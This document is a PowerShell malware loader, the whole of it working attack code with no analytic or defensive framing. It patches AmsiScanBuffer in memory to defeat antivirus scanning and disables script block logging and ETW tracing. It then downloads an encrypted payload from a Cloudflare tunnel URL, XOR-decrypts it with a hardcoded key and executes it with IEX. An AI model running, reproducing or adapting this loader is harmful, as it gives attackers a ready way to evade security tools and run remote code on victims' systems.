# Debug version - shows what's happening

# Quick AMSI bypass
$W=@"
using System;using System.Runtime.InteropServices;
public class W{
[DllImport("kernel32")]public static extern IntPtr GetProcAddress(IntPtr m,string p);
[DllImport("kernel32")]public static extern IntPtr LoadLibrary(string n);
[DllImport("kernel32")]public static extern bool VirtualProtect(IntPtr a,UIntPtr s,uint n,out uint o);
}
"@
Add-Type $W
$L=[W]::LoadLibrary("am"+"si.dll")
$A=[W]::GetProcAddress($L,"Amsi"+"Scan"+"Buffer")
$p=0
[W]::VirtualProtect($A,[UIntPtr]::new(0x20),0x40,[ref]$p)|Out-Null
$B=[Byte[]](0x41,0x5F,0x41,0x5E,0x5F,0xB8,0x57,0x00,0x07,0x80,0xC3)
$A=[Int64]$A+0x14
[Runtime.InteropServices.Marshal]::Copy($B,0,[IntPtr]$A,$B.Length)
[W]::VirtualProtect([IntPtr]$A,[UIntPtr]::new(0x20),$p,[ref]$p)|Out-Null
Write-Host "[+] AMSI bypassed"

# Disable logging
try{$s=[Ref].Assembly.GetType('System.Management.Automation.Utils').GetField('cachedGroupPolicySettings','NonPublic,Static').GetValue($null);if($s['ScriptBlockLogging']){$s['ScriptBlockLogging']['EnableScriptBlockLogging']=0};Write-Host "[+] Script logging disabled"}catch{Write-Host "[-] Script logging disable failed"}
try{[Reflection.Assembly]::LoadWithPartialName('System.Core')|Out-Null;$a=[Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider');$b=$a.GetField('etwProvider','NonPublic,Static');$b.SetValue($null,0);Write-Host "[+] ETW patched"}catch{Write-Host "[-] ETW patch failed"}

[Net.ServicePointManager]::SecurityProtocol='Tls12'

$u='https://dale-recently-shed-cup.trycloudflare.com/payloads/i5_syscall_encrypted.txt?key=2cf7cbeab9fd5a21'
$k='MySecretKey2025'

Write-Host "[*] Downloading encrypted payload..."
try {
    $enc = (New-Object Net.WebClient).DownloadString($u)
    Write-Host "[+] Downloaded $($enc.Length) bytes"
    
    # XOR decrypt
    $keyBytes = [Text.Encoding]::UTF8.GetBytes($k)
    $encBytes = [Convert]::FromBase64String($enc)
    $dec = New-Object byte[] $encBytes.Length
    
    for($i=0; $i -lt $encBytes.Length; $i++) {
        $dec[$i] = $encBytes[$i] -bxor $keyBytes[$i % $keyBytes.Length]
    }
    
    $payload = [Text.Encoding]::UTF8.GetString($dec)
    Write-Host "[+] Decrypted $($payload.Length) bytes"
    Write-Host "[*] Executing payload..."
    
    # Execute decrypted payload
    IEX $payload
    
    Write-Host "[+] Payload executed"
} catch {
    Write-Host "[-] Error: $_"
    Write-Host $_.Exception.Message
}
